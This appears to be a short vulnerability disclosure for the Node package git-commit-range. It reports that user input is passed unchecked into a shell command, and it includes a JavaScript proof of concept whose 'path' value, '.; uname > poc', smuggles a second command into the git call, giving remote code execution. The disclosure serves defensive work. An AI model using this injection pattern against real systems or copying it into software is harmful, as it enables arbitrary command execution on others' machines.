# Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/aichbauer/node-git-commit-range/blob/master/index.js#L32

# POC

```js
// poc.js
const gitCommitRange = require('git-commit-range');

gitCommitRange(); 

gitCommitRange({
  path: '.; uname > poc',
  from: '15be93c31ad87c9ced03ba0b60fc2fb55c977c5c',
  to: '32b940b014322834966d79b109d2d7adec8e3ea3',
  include: false,
});
```

# Impact
`RCE` on `git-commit-range` via `insecure command formatting`
